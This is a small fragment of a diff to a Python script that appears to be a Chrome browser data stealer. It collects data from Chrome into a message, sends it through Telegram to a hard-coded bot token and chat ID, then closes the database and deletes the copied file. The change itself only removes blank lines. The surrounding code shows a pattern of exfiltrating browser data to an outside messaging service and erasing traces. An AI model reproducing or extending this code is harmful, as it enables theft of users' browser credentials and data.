@@ -107,9 +107,7 @@ def main():
             
             message += "\n" + "Chrome " + "=" * 42
             send_to_telegram(message, TOKEN, CHAT_ID)
-
             
-
     cursor.close()
     db.close()
     os.remove(filename)
